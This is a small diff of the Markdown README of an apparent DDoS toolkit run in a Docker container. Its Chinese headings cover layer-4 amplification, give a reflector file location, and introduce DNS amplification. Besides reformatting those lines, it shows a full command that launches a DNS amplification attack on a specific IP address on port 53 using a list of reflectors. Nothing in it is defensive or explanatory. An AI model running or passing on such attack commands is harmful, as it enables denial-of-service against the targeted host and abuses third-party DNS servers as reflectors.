@@ -11,11 +11,9 @@
 
 	docker exec -it ddos-layer7 /bin/bash
 
-#### ddos-layer4使用（放大）
-
-反射文件位置/root/files
-
+#### ddos-layer4使用（放大）反射文件位置/root/files
 DNS放大
+
 	docker exec -it ddos-layer7 python3 start.py DNS 80.79.4.32:53 1 60 dns.txt &
 
 ## Features And Methods
